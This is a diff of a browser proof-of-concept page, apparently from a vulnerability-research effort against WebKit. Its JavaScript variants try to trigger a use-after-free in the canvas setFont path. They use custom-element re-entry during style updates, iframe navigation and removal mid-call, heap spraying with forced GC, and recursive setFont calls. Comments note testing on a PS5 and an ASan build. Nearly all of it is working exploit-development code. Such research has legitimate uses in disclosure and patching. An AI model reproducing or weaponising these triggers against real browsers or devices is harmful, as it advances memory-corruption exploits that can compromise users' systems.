@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>VULN-004 — Canvas setFont UAF PoC</title>
+<title>VULN-004 Variant D — iframe document detach during setFont</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body {
@@ -15,7 +15,7 @@ h2   { color: #58a6ff; margin-bottom: 4px; font-size: 15px; }
 #log {
   background: #161b22; border: 1px solid #30363d;
   border-radius: 6px; padding: 12px;
-  min-height: 180px; max-height: 460px;
+  min-height: 200px; max-height: 460px;
   overflow-y: auto; margin-bottom: 12px;
 }
 .ok   { color: #3fb950; }
@@ -30,54 +30,53 @@ button {
   padding: 10px 22px; font-family: inherit;
   font-size: 13px; cursor: pointer;
 }
-button:hover { background: #30363d; }
+button:hover   { background: #30363d; }
 button:disabled { opacity: .4; cursor: default; }
 </style>
 </head>
 <body>
 
-<h2>VULN-004 — CanvasRenderingContext2D::setFont UAF</h2>
+<h2>VULN-004 — Variant D (escalated from [H] to [P])</h2>
 <p class="sub">
-  Source: WebCore/html/canvas/CanvasRenderingContext2D.cpp:105–118<br>
-  Shape: raw <code>this</code> used after <code>updateStyleIfNeeded()</code> — comment in source confirms JS runs synchronously here
+  Confirmed: connectedCallback() fires INSIDE C++ updateStyleIfNeeded()<br>
+  Goal: detach canvas Document while C++ holds raw Document& reference<br>
+  Shape: Document& document = canvas().document() — used after JS replaces the document
 </p>
 
 <div id="log"></div>
-<button id="btn">▶ Run PoC</button>
+<button id="btn">▶ Run Variant D</button>
 
 <!--
-  C++ SHAPE:
-    void CanvasRenderingContext2D::setFont(const String& newFont)
-    {
-        Document& document = canvas().document();       // step 1
-        document.updateStyleIfNeeded();                 // step 2 — JS CAN RUN HERE
-        // comment L115: "updating style can cause JS to run synchronously"
-        setFontWithoutUpdatingStyle(newFont);           // step 3 — uses `this`
-    }
+  CONFIRMED in prior run:
+    connectedCallback() fires synchronously inside updateStyleIfNeeded()
+    canvas.remove() succeeds while C++ is in setFont()
 
-  TRIGGER STRATEGY:
-    We need JS to run SYNCHRONOUSLY inside updateStyleIfNeeded()
-    and during that JS we remove/destroy the canvas element.
-    If the CanvasRenderingContext2D is then freed, step 3 is a UAF.
+  WHY NO CRASH YET:
+    JS variable `ctx` still holds a reference to CanvasRenderingContext2D
+    JSC GC will not collect it while JS holds a live reference
+    setFontWithoutUpdatingStyle(this) runs on a live-but-detached context
 
-  THREE VARIANTS tested in sequence:
+  VARIANT D STRATEGY — target the Document reference, not the context:
 
-  VARIANT A — Custom Element upgrade during style update
-    Custom elements can have connectedCallback() run synchronously
-    during style recalculation if they are pending upgrade.
-    Insert a pending custom element, then call ctx.font = "..." to
-    trigger style update which processes pending upgrades.
+    C++ code:
+      Document& document = canvas().document();   // ← raw reference to Document
+      document.updateStyleIfNeeded();              // ← JS runs here
+      setFontWithoutUpdatingStyle(newFont);        // ← uses `this`, may use document
 
-  VARIANT B — iframe srcdoc font + cross-frame canvas removal
-    Canvas in an iframe. Parent loads @font-face. When ctx.font triggers
-    style update inside the iframe, parent removes the iframe — destroying
-    the CanvasRenderingContext2D while setFont is mid-execution.
+    If we navigate the iframe to about:blank during updateStyleIfNeeded():
+      → The old Document is replaced
+      → C++ holds Document& pointing to the OLD (now detached) Document
+      → Any post-update access to `document` = stale Document reference
+      → setFontWithoutUpdatingStyle may call back into the canvas document
+      → Potential UAF / crash on detached document access
 
-  VARIANT C — document.write re-entrant style update
-    Call ctx.font during a script triggered by a style update cascade.
-    Verify whether re-entrant style updates can cause stale context.
+  VARIANT D2 — null all JS refs + GC spray during connectedCallback:
+    null ctx, null canvas, null all references
+    spray heap with controlled allocations
+    if JSC concurrent GC collects CanvasRenderingContext2D before
+    setFontWithoutUpdatingStyle() runs → heap-use-after-free
 
-  EXPECTED: crash / hang / corrupted canvas output / ASAN heap-use-after-free
+  EXPECTED: crash on Document access / ctx dereference / ASAN report
   OBSERVED: (fill after test)
 -->
 
@@ -93,262 +92,298 @@ function log(msg, cls) {
   logEl.scrollTop = logEl.scrollHeight;
 }
 function sep() {
-  const d = document.createElement('div');
-  d.style.cssText = 'border-top:1px solid #30363d;margin:5px 0';
-  logEl.appendChild(d);
+  const hr = document.createElement('div');
+  hr.style.cssText = 'border-top:1px solid #30363d;margin:5px 0';
+  logEl.appendChild(hr);
 }
 
-// ═══════════════════════════════════════════════════════════
-// VARIANT A — Custom Element upgrade during style update
-// ═══════════════════════════════════════════════════════════
-function variantA() {
+// ═══════════════════════════════════════════════════════════════════
+// VARIANT D1 — navigate iframe document during updateStyleIfNeeded
+// ═══════════════════════════════════════════════════════════════════
+function variantD1() {
   return new Promise(resolve => {
     sep();
-    log('[A] Custom Element upgrade during updateStyleIfNeeded()', 'info');
-
-    // canvas we will try to destroy mid-setFont
-    const canvas = document.createElement('canvas');
-    canvas.width = 100; canvas.height = 100;
-    document.body.appendChild(canvas);
-    const ctx = canvas.getContext('2d');
-    if (!ctx) { log('[A] canvas 2d not available', 'err'); return resolve(false); }
-
-    let upgradeFired = false;
-    let survived     = false;
-
-    // Define a custom element whose connectedCallback runs synchronously
-    // during style resolution. We delay definition until AFTER inserting
-    // the element so the upgrade is PENDING when setFont triggers style update.
-    const TAG = 'x-uaf-a-' + Date.now();
-
-    // Step 1: insert the element BEFORE defining it → sits as "unresolved"
-    const trigger = document.createElement(TAG);
-    document.body.appendChild(trigger);
-    log(`[A] inserted pending upgrade element <${TAG}>`, 'ok');
-
-    // Step 2: define now → upgrade is queued but fires synchronously
-    //         during the NEXT style recalculation
-    customElements.define(TAG, class extends HTMLElement {
-      connectedCallback() {
-        if (upgradeFired) return;
-        upgradeFired = true;
-        log('[A] connectedCallback() fired INSIDE updateStyleIfNeeded()!', 'warn');
-        log('[A] removing canvas now — this is inside C++ setFont execution', 'warn');
-        try {
-          canvas.remove();
-          // ctx (CanvasRenderingContext2D*) may now be freed
-          // C++ will call setFontWithoutUpdatingStyle(this) after returning
-          log('[A] canvas.remove() succeeded inside style update', 'warn');
-        } catch(e) {
-          log('[A] canvas.remove() threw: ' + e.message, 'err');
-        }
-      }
-    });
-
-    // Step 3: ctx.font triggers updateStyleIfNeeded()
-    //         → style recalc → custom element upgrade → connectedCallback → canvas.remove()
-    //         → updateStyleIfNeeded returns
-    //         → setFontWithoutUpdatingStyle(this)  ← this = freed context = UAF
-    log('[A] calling ctx.font — triggering updateStyleIfNeeded() ...', 'warn');
-    try {
-      ctx.font = '18px sans-serif'; // THE TRIGGER
-      survived = true;
-      log('[A] ctx.font returned — checking state', survived ? 'ok' : 'err');
-      if (upgradeFired) {
-        log('[A] connectedCallback fired AND setFont returned → inspect for silent corruption', 'warn');
-      } else {
-        log('[A] connectedCallback did NOT fire synchronously on this platform', 'info');
-      }
-    } catch(e) {
-      log('[A] EXCEPTION from ctx.font: ' + e.message, 'hit');
-    }
-
-    // cleanup
-    try { trigger.remove(); } catch(_) {}
-    try { canvas.remove();  } catch(_) {}
-    resolve(upgradeFired);
-  });
-}
-
-// ═══════════════════════════════════════════════════════════
-// VARIANT B — iframe canvas removed from parent during setFont
-// ═══════════════════════════════════════════════════════════
-function variantB() {
-  return new Promise(resolve => {
-    sep();
-    log('[B] iframe canvas + parent removes iframe mid-setFont', 'info');
+    log('[D1] iframe navigation during updateStyleIfNeeded()', 'info');
+    log('[D1] target: stale Document& reference after iframe navigates away', 'info');
 
     const iframe = document.createElement('iframe');
-    iframe.style.cssText = 'width:200px;height:200px;position:absolute;left:-9999px';
+    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
     document.body.appendChild(iframe);
 
-    // Use srcdoc so we fully control the iframe content
-    iframe.srcdoc = `<!DOCTYPE html>
-<html><body>
-<canvas id="c" width="200" height="200"></canvas>
-<script>
-window._ctx = document.getElementById('c').getContext('2d');
-window._ready = true;
-<\/script>
+    iframe.srcdoc = `<!DOCTYPE html><html><body>
+<canvas id="c" width="64" height="64"></canvas>
+<script>window._ready = true;<\/script>
 </body></html>`;
 
     iframe.onload = function() {
       const iwin = iframe.contentWindow;
-      if (!iwin || !iwin._ctx) {
-        log('[B] iframe ctx not available', 'err');
+      const idoc = iframe.contentDocument;
+      if (!iwin || !iwin._ready) {
+        log('[D1] iframe not ready', 'err');
         iframe.remove();
         return resolve(false);
       }
 
-      const ctx = iwin._ctx;
-      log('[B] iframe canvas context obtained', 'ok');
-
-      // We'll remove the iframe from a MutationObserver on the inner canvas
-      // MutationObserver fires sync in some cases during style update
-      let triggered = false;
-      const mo = new MutationObserver(() => {
-        if (triggered) return;
-        triggered = true;
-        log('[B] MutationObserver fired — removing iframe now', 'warn');
-        try { iframe.remove(); } catch(_) {}
-      });
-      mo.observe(iframe.contentDocument.body, { childList: true, subtree: true });
-
-      // Also try direct removal via font load callback
-      if (iwin.document && iwin.document.fonts) {
-        iwin.document.fonts.onloadingdone = () => {
-          if (!triggered) {
-            triggered = true;
-            log('[B] fonts.onloadingdone inside iframe — removing iframe', 'warn');
-            try { iframe.remove(); } catch(_) {}
-          }
-        };
+      const canvas = idoc.getElementById('c');
+      const ctx    = canvas.getContext('2d');
+      if (!ctx) {
+        log('[D1] ctx not available', 'err');
+        iframe.remove();
+        return resolve(false);
       }
 
-      // Inject a @font-face that will be resolved during ctx.font assignment
-      const style = iwin.document.createElement('style');
-      // tiny valid woff2 (empty glyph set) encoded as data URI
-      style.textContent = `
-        @font-face {
-          font-family: 'UAFFont';
-          src: local('Arial'), local('Helvetica');
-          font-display: block;
-        }
-      `;
-      iwin.document.head.appendChild(style);
+      log('[D1] iframe canvas context obtained', 'ok');
 
-      log('[B] calling iframe ctx.font with custom font family...', 'warn');
+      // We define a custom element in the PARENT document
+      // whose connectedCallback navigates the iframe
+      const TAG = 'x-d1-' + Date.now();
+      let cbFired = false;
+
+      customElements.define(TAG, class extends HTMLElement {
+        connectedCallback() {
+          if (cbFired) return;
+          cbFired = true;
+          log('[D1] connectedCallback INSIDE updateStyleIfNeeded() — navigating iframe!', 'warn');
+
+          // Navigate the iframe — this replaces the Document that C++ holds as Document&
+          // C++ currently holds: Document& document = canvas().document()
+          // After this navigation, that Document is detached/replaced
+          try {
+            iframe.src = 'about:blank';
+            log('[D1] iframe.src = about:blank — Document being replaced', 'warn');
+          } catch(e) {
+            log('[D1] navigation error: ' + e.message, 'err');
+          }
+
+          // Also try to null the canvas JS reference
+          // If the context is only held by C++ stack now...
+          try {
+            iframe.remove();
+            log('[D1] iframe removed from DOM — Document detached', 'warn');
+          } catch(e) {}
+        }
+      });
+
+      // Insert pending-upgrade element in parent so it upgrades during
+      // the next updateStyleIfNeeded() call on the IFRAME's document
+      // We need the upgrade to fire in the context of the iframe's style update
+      // Inject the trigger element INTO the iframe
+      const trigger = idoc.createElement(TAG);
+      idoc.body.appendChild(trigger);
+      log('[D1] pending upgrade element inserted in iframe', 'ok');
+
+      // Define it NOW so it's upgraded during next style recalc
+      // (it was already in DOM, upgrade fires on next style update)
+      // ctx.font on the iframe context triggers iframe document style update
+      log('[D1] calling iframe ctx.font — triggering iframe updateStyleIfNeeded()...', 'warn');
+
       let survived = false;
       try {
-        ctx.font = '16px UAFFont';
+        ctx.font = '18px sans-serif';
         survived = true;
-        log('[B] ctx.font returned — iframe removed: ' + !document.contains(iframe), 'ok');
+        log('[D1] ctx.font returned', survived ? 'ok' : 'err');
+        log('[D1] connectedCallback fired: ' + cbFired, cbFired ? 'warn' : 'info');
       } catch(e) {
-        log('[B] EXCEPTION: ' + e.message, 'hit');
+        log('[D1] EXCEPTION from ctx.font: ' + e.message, 'hit');
       }
 
-      mo.disconnect();
       try { iframe.remove(); } catch(_) {}
-      resolve(triggered && survived);
+      resolve(cbFired);
     };
   });
 }
 
-// ═══════════════════════════════════════════════════════════
-// VARIANT C — rapid repeated setFont with DOM mutation
-// ═══════════════════════════════════════════════════════════
-function variantC() {
+// ═══════════════════════════════════════════════════════════════════
+// VARIANT D2 — null all JS refs + heap spray during connectedCallback
+// ═══════════════════════════════════════════════════════════════════
+function variantD2() {
   return new Promise(resolve => {
     sep();
-    log('[C] rapid setFont + concurrent DOM mutation loop', 'info');
+    log('[D2] null all JS refs + GC spray during connectedCallback', 'info');
+    log('[D2] target: JSC concurrent GC collects ctx before setFontWithoutUpdatingStyle()', 'info');
 
-    const ITERATIONS = 200;
-    let crashed = false;
+    const holder = { canvas: null, ctx: null };
 
-    // Create a canvas, get ctx, then hammer setFont while
-    // concurrently reparenting/removing the canvas in between.
-    // If updateStyleIfNeeded ever catches us mid-removal, stale ctx.
+    holder.canvas = document.createElement('canvas');
+    holder.canvas.width = 64; holder.canvas.height = 64;
+    document.body.appendChild(holder.canvas);
+    holder.ctx = holder.canvas.getContext('2d');
+    if (!holder.ctx) {
+      log('[D2] ctx not available', 'err');
+      return resolve(false);
+    }
 
-    const container = document.createElement('div');
-    document.body.appendChild(container);
-    const canvas = document.createElement('canvas');
-    canvas.width = 64; canvas.height = 64;
-    container.appendChild(canvas);
-    const ctx = canvas.getContext('2d');
-    if (!ctx) { log('[C] ctx not available', 'err'); return resolve(false); }
+    const TAG = 'x-d2-' + Date.now();
+    let cbFired = false;
 
-    const fonts = [
-      '10px serif', '12px monospace', '14px sans-serif',
-      '16px Arial', '18px Georgia', '20px Verdana',
-    ];
+    customElements.define(TAG, class extends HTMLElement {
+      connectedCallback() {
+        if (cbFired) return;
+        cbFired = true;
+        log('[D2] connectedCallback INSIDE C++ setFont — nulling all refs', 'warn');
 
-    // Alternate: setFont, then reparent canvas, then setFont again
-    // If style update in first setFont delays until reparent is processed,
-    // and during that we get JS re-entry, ctx may be stale.
-    for (let i = 0; i < ITERATIONS; i++) {
-      try {
-        ctx.font = fonts[i % fonts.length];
+        // Step 1: remove canvas from DOM
+        try { holder.canvas.remove(); } catch(_) {}
 
-        // Mid-loop: briefly detach and reattach canvas
-        if (i % 20 === 10) {
-          container.removeChild(canvas);
-          container.appendChild(canvas);
+        // Step 2: null ALL JavaScript references to the context
+        // If JSC GC sees zero JS references, it MAY collect the wrapper
+        // while C++ still holds `this` (the raw CanvasRenderingContext2D*)
+        const savedCtx    = holder.ctx;
+        const savedCanvas = holder.canvas;
+        holder.ctx    = null;
+        holder.canvas = null;
+        log('[D2] all JS references nulled', 'warn');
+
+        // Step 3: large heap spray to pressure JSC GC
+        // If concurrent GC is running, it may collect savedCtx
+        // whose backing C++ object is still in the C++ call stack
+        const spray = [];
+        for (let i = 0; i < 2000; i++) {
+          spray.push(new Float64Array(256));
+        }
+        spray.length = 0;
+        log('[D2] heap spray complete (2000 × Float64Array)', 'warn');
+
+        // Step 4: hint GC (non-standard but some engines respect it)
+        if (typeof gc === 'function') {
+          try { gc(); log('[D2] gc() called', 'warn'); } catch(_) {}
         }
 
-        // Verify ctx is still functional
-        if (i % 50 === 0) {
-          const w = ctx.measureText('X').width;
-          if (isNaN(w) || w <= 0) {
-            log(`[C] measureText returned invalid at iteration ${i}: ${w}`, 'hit');
-            crashed = true;
-            break;
-          }
-        }
-      } catch(e) {
-        log(`[C] EXCEPTION at iteration ${i}: ${e.message}`, 'hit');
-        crashed = true;
-        break;
+        log('[D2] returning from connectedCallback —', 'warn');
+        log('[D2] C++ will now call setFontWithoutUpdatingStyle(this)', 'warn');
+        log('[D2] if GC collected ctx above → this = freed memory = UAF', 'warn');
+
+        // restore for post-call check
+        holder.ctx    = savedCtx;
+        holder.canvas = savedCanvas;
       }
+    });
+
+    const trigger = document.createElement(TAG);
+    document.body.appendChild(trigger);
+    log('[D2] pending upgrade element inserted', 'ok');
+
+    log('[D2] calling ctx.font...', 'warn');
+    let survived = false;
+    try {
+      holder.ctx.font = '18px serif';
+      survived = true;
+
+      // Verify: can we still use the context?
+      // Silent UAF might corrupt internal state without immediate crash
+      const fontAfter = holder.ctx.font;
+      log('[D2] ctx.font returned: "' + fontAfter + '"', 'ok');
+
+      // Check for impossible/corrupt font state
+      if (!fontAfter || fontAfter.length === 0 || fontAfter.includes('\x00')) {
+        log('[D2] CORRUPT font state detected: "' + fontAfter + '"', 'hit');
+      } else {
+        log('[D2] font state looks normal — no silent corruption detected', 'info');
+      }
+
+      // Try measureText to stress the font system post-UAF
+      const w = holder.ctx.measureText('WebKit UAF').width;
+      log('[D2] measureText width: ' + w.toFixed(2), w > 0 ? 'ok' : 'hit');
+
+    } catch(e) {
+      log('[D2] EXCEPTION: ' + e.message, 'hit');
     }
 
-    if (!crashed) {
-      log(`[C] survived ${ITERATIONS} iterations — no exception`, 'ok');
-    }
-
-    try { container.remove(); } catch(_) {}
-    resolve(crashed);
+    try { trigger.remove();        } catch(_) {}
+    try { holder.canvas.remove();  } catch(_) {}
+    resolve(cbFired && survived);
   });
 }
 
-// ═══════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════
+// VARIANT D3 — double setFont re-entry via nested custom elements
+// ═══════════════════════════════════════════════════════════════════
+function variantD3() {
+  return new Promise(resolve => {
+    sep();
+    log('[D3] nested re-entry: setFont inside connectedCallback inside setFont', 'info');
+    log('[D3] target: stack corruption / double-free via recursive style update', 'info');
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 64; canvas.height = 64;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext('2d');
+    if (!ctx) { log('[D3] ctx not available', 'err'); return resolve(false); }
+
+    const TAG = 'x-d3-' + Date.now();
+    let depth = 0;
+    const MAX_DEPTH = 3;
+
+    customElements.define(TAG, class extends HTMLElement {
+      connectedCallback() {
+        depth++;
+        log(`[D3] connectedCallback depth=${depth} INSIDE updateStyleIfNeeded()`, 'warn');
+
+        if (depth < MAX_DEPTH) {
+          // Call ctx.font AGAIN inside the callback — recursive style update
+          // This causes setFont → updateStyleIfNeeded → connectedCallback → setFont...
+          const inner = document.createElement(TAG);
+          document.body.appendChild(inner);
+          try {
+            log(`[D3] calling ctx.font recursively at depth=${depth}`, 'warn');
+            ctx.font = `${10 + depth * 2}px monospace`;
+            log(`[D3] recursive setFont returned at depth=${depth}`, 'ok');
+          } catch(e) {
+            log(`[D3] EXCEPTION at depth=${depth}: ${e.message}`, 'hit');
+          }
+          try { inner.remove(); } catch(_) {}
+        }
+        depth--;
+      }
+    });
+
+    const trigger = document.createElement(TAG);
+    document.body.appendChild(trigger);
+
+    log('[D3] calling outer ctx.font...', 'warn');
+    let survived = false;
+    try {
+      ctx.font = '14px Arial';
+      survived = true;
+      log('[D3] outer ctx.font returned — font: "' + ctx.font + '"', 'ok');
+    } catch(e) {
+      log('[D3] EXCEPTION from outer setFont: ' + e.message, 'hit');
+    }
+
+    try { trigger.remove(); } catch(_) {}
+    try { canvas.remove();  } catch(_) {}
+    resolve(survived);
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════════
 // MAIN
-// ═══════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════
 document.getElementById('btn').addEventListener('click', async function() {
   this.disabled = true;
-  log('=== VULN-004 CanvasRenderingContext2D::setFont UAF ===', 'info');
-  log('Source: updateStyleIfNeeded() runs JS synchronously — no Ref<> protectedThis', 'info');
+  log('=== VULN-004 Variant D — Escalated to [P] PLAUSIBLE ===', 'info');
+  log('Re-entry surface: CONFIRMED (connectedCallback inside updateStyleIfNeeded)', 'ok');
+  log('Missing Ref<CanvasRenderingContext2D> protectedThis: CONFIRMED', 'ok');
   sep();
 
-  const rA = await variantA();
-  const rB = await variantB();
-  const rC = await variantC();
+  const rD1 = await variantD1();
+  const rD2 = await variantD2();
+  const rD3 = await variantD3();
 
   sep();
   log('=== SUMMARY ===', 'info');
-  log(`Variant A (custom element upgrade):   ${rA ? 'TRIGGERED ← interesting' : 'not triggered'}`,
-      rA ? 'warn' : 'ok');
-  log(`Variant B (iframe font + removal):    ${rB ? 'TRIGGERED ← interesting' : 'not triggered'}`,
-      rB ? 'warn' : 'ok');
-  log(`Variant C (rapid setFont + reparent): ${rC ? 'EXCEPTION/CORRUPT'      : 'survived'}`,
-      rC ? 'hit'  : 'ok');
+  log('D1 (iframe nav during update): ' + (rD1 ? 'callback fired' : 'not triggered'),
+      rD1 ? 'warn' : 'info');
+  log('D2 (null refs + GC spray):     ' + (rD2 ? 'callback fired, survived' : 'no trigger'),
+      rD2 ? 'warn' : 'info');
+  log('D3 (recursive setFont):        ' + (rD3 ? 'survived' : 'exception/crash'),
+      rD3 ? 'ok' : 'hit');
+  sep();
+  log('Next step: run on ASan MiniBrowser to detect silent heap-use-after-free', 'info');
+  log('ASan will catch corruption even when PS5 shows no visible crash', 'info');
 
-  if (!rA && !rB && !rC) {
-    log('No trigger path confirmed on this platform.', 'info');
-    log('updateStyleIfNeeded may not allow synchronous JS re-entry here.', 'info');
-  }
-
-  this.textContent  = '↺ Run Again';
-  this.disabled     = false;
+  this.textContent = '↺ Run Again';
+  this.disabled = false;
 });
 </script>
 </body>
